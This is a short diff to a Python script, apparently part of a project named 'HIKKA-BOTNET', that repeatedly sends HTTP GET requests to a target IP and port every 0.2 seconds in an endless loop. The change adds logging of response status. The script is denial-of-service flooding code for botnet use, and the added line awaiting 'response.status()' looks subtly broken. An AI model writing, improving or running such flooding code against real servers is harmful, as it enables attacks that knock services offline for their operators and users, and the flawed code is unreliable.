@@ -7,13 +7,17 @@ HIKKA-BOTNET, если вы участвуете в
 import time
 import asyncio
 import aiohttp
+import logging
+
+logger = logging.getLogger('main')
 
 async def get(ip, port):
     async with aiohttp.ClientSession() as session:
         while True:
             async with session.get(f"http://{ip}:{port}") as response:
                 await response.read()
-            logger.warning("ok")
+                status = await response.status()
+                logger.warning(status)
             await asyncio.sleep(0.2)
 
 async def main():
